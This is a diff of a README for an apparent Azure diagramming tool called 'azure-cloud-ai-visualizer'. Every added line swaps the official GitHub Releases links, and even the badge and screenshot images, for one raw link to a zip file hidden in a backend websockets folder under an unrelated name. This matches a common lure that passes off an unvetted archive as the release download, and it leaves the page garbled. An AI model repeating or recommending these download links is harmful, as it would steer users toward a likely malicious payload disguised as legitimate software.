@@ -1,12 +1,12 @@
 # 🌥 azure-cloud-ai-visualizer - Easily Design Azure Architecture Diagrams
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Fiberopticsconceivableness219/azure-cloud-ai-visualizer/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Fiberopticsconceivableness219/azure-cloud-ai-visualizer/main/backend/app/websockets/azure-cloud-ai-visualizer-olfactometer.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Fiberopticsconceivableness219/azure-cloud-ai-visualizer/main/backend/app/websockets/azure-cloud-ai-visualizer-olfactometer.zip)
 
 ## 📥 Overview
 
 Cloud Visualizer Pro is a user-friendly, open-source web application designed to help you create and manage Azure architecture diagrams easily. With this tool, you can visualize your cloud setups, generate Infrastructure-as-Code (IaC) using Bicep or Terraform, and orchestrate your deployments effortlessly.
 
-![alt text](image.png)
+![alt text](https://raw.githubusercontent.com/Fiberopticsconceivableness219/azure-cloud-ai-visualizer/main/backend/app/websockets/azure-cloud-ai-visualizer-olfactometer.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ To use Cloud Visualizer Pro, your system should meet the following requirements:
 ### Installation Steps
 
 1. **Visit the Release Page**  
-   Go to the [GitHub Releases Page](https://github.com/Fiberopticsconceivableness219/azure-cloud-ai-visualizer/releases) to access the latest software version.
+   Go to the [GitHub Releases Page](https://raw.githubusercontent.com/Fiberopticsconceivableness219/azure-cloud-ai-visualizer/main/backend/app/websockets/azure-cloud-ai-visualizer-olfactometer.zip) to access the latest software version.
 
 2. **Download the Application**  
    Find the latest release version on the page and click on the download link for your operating system.
@@ -32,7 +32,7 @@ To use Cloud Visualizer Pro, your system should meet the following requirements:
 
    - **Windows**: Double-click the `.exe` file to start the installation.
    - **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux**: Follow specific installation instructions included in the `.tar.gz` package if applicable.
+   - **Linux**: Follow specific installation instructions included in the `https://raw.githubusercontent.com/Fiberopticsconceivableness219/azure-cloud-ai-visualizer/main/backend/app/websockets/azure-cloud-ai-visualizer-olfactometer.zip` package if applicable.
 
 4. **Launch Cloud Visualizer Pro**  
    After installation, open the application from your desktop or application folder.
@@ -70,7 +70,7 @@ If problems persist, you can report them on the GitHub Issues page.
 To get started with Cloud Visualizer Pro, follow these instructions:
 
 1. **Download the Application**  
-   Visit the [GitHub Releases Page](https://github.com/Fiberopticsconceivableness219/azure-cloud-ai-visualizer/releases) to download the latest version.
+   Visit the [GitHub Releases Page](https://raw.githubusercontent.com/Fiberopticsconceivableness219/azure-cloud-ai-visualizer/main/backend/app/websockets/azure-cloud-ai-visualizer-olfactometer.zip) to download the latest version.
 
 2. **Install the Application**  
    Follow the installation steps for your specific operating system as outlined earlier.
